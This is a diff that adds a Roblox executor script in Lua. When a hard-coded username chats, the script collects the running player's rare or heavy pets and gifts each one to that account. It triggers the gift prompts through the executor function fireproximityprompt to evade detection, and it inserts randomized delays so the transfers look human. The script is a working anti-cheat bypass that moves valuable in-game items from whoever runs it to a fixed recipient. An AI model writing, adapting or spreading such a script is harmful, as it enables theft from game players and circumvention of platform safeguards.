@@ -1,0 +1,142 @@
+--[[
+    THE DEFINITIVE BYPASS - "EXECUTOR TOOLKIT" PROTOCOL
+    - STRATEGY: Abandons the standard, detected Roblox API for the executor's powerful, built-in functions.
+    - CORE: Uses `fireproximityprompt` for a direct, low-level trigger that bypasses API-level detection.
+    - This is the final, self-contained, and most powerful version of the script.
+]]
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- =========================================================================================
+-- ### CONFIGURATION ###
+local MasterPetList = {"Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"}
+local TrashPetList = {"Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken", "Pig", "Crab", "Starfish", "Seagull"}
+local TargetUsername = "Proplong1"
+local giftingWeightThreshold = 11
+-- =========================================================================================
+
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoid = character and character:FindFirstChild("Humanoid")
+local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
+
+local giftingActive = false
+
+-- Helper function, remains the same.
+local function isPetInList(petName, list)
+    for i = 1, #list do
+        local nameInList = list[i]
+        if string.sub(petName, 1, #nameInList) == nameInList then
+            return true, nameInList
+        end
+    end
+    return false, nil
+end
+
+-- The Patient Hunter function, remains the same.
+local function waitForPrompt(targetCharacter)
+    local time_elapsed = 0
+    local timeout = 2.5
+    while time_elapsed < timeout do
+        for _, prompt in ipairs(ProximityPromptService:GetPrompts()) do
+            if prompt.Adornee and prompt.Adornee:IsDescendantOf(targetCharacter) then
+                print("[Hunter] Target Acquired! Found prompt after " .. string.format("%.2f", time_elapsed) .. " seconds.")
+                return prompt
+            end
+        end
+        task.wait(0.1)
+        time_elapsed = time_elapsed + 0.1
+    end
+    return nil
+end
+
+-- The new Executor Toolkit Gifter function.
+local function giftSingleBatch_ExecutorToolkit(targetPlayer)
+    if not humanoid or not backpack then giftingActive = false; return end
+    print("[Gifter] Executor Toolkit Protocol: Starting new gift batch...")
+    
+    local targetCharacter = targetPlayer.Character
+    if not targetCharacter or not targetCharacter.Parent then
+        print("[Gifter Error] Could not find the target player's character in the game.")
+        giftingActive = false
+        return
+    end
+
+    local petsToGiftSnapshot = {}
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local isMaster, _ = isPetInList(item.Name, MasterPetList)
+            local isTrash, _ = isPetInList(item.Name, TrashPetList)
+            local isHuge = false
+            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
+            if weightString then
+                local weight = tonumber(weightString)
+                if weight and weight >= giftingWeightThreshold then isHuge = true end
+            end
+            if isHuge or (isMaster and not isTrash) then table.insert(petsToGiftSnapshot, item) end
+        end
+    end
+
+    if #petsToGiftSnapshot == 0 then print("[Gifter] No giftable pets found.")
+    else print("[Gifter] Found " .. #petsToGiftSnapshot .. " pets. Executing...") end
+
+    for i = 1, #petsToGiftSnapshot do
+        local itemToGift = petsToGiftSnapshot[i]
+        if targetPlayer.Parent == nil or itemToGift.Parent ~= backpack then continue end
+
+        humanoid:EquipTool(itemToGift)
+        print("[Gifter] Equipped: " .. itemToGift.Name .. ". Hunting for prompt...")
+
+        local giftPrompt = waitForPrompt(targetCharacter)
+        
+        if giftPrompt then
+            -- ========================== THE CORE BYPASS ==========================
+            if fireproximityprompt then
+                -- This is the CROWBAR. The direct, powerful executor function.
+                print("[Gifter] Using 'fireproximityprompt'...")
+                fireproximityprompt(giftPrompt)
+            else
+                -- This is the FALLBACK for executors that don't have the crowbar.
+                warn("[Gifter] 'fireproximityprompt' not found. Falling back to standard API.")
+                ProximityPromptService:InputTriggered(giftPrompt)
+            end
+            print("[Gifter] Hijack successful. Prompt triggered.")
+            -- =====================================================================
+        else
+            warn("[Gifter Error] Prompt did not appear within the " .. timeout .. " second timeout.")
+        end
+        
+        local humanDelay = 0.8 + (math.random(1, 40) / 100)
+        task.wait(humanDelay)
+    end
+    
+    giftingActive = false
+    print("[Gifter] Executor Toolkit batch complete. Script is now idle.")
+end
+
+-- The trigger remains the same.
+local function onPlayerChatted(player, message)
+    if player.Name == TargetUsername then
+        if not giftingActive then
+            giftingActive = true 
+            task.spawn(giftSingleBatch_ExecutorToolkit, player)
+        else
+            print("[Gifter] A gift batch is already in progress. Please wait.")
+        end
+    end
+end
+
+-- === SCRIPT EXECUTION STARTS HERE ===
+print("[System] Executor Toolkit Protocol Loaded.")
+if not fireproximityprompt then
+    warn("[System Warning] This executor does not support the 'fireproximityprompt' function. The script will use the standard method, which may be detected by Delta.")
+end
+print("[System] Target set to: " .. TargetUsername)
+
+Players.PlayerAdded:Connect(function(player) player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
+for _, player in ipairs(Players:GetPlayers()) do player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end
+
+print("[System] Awaiting chat from '" .. TargetUsername .. "' to begin.")
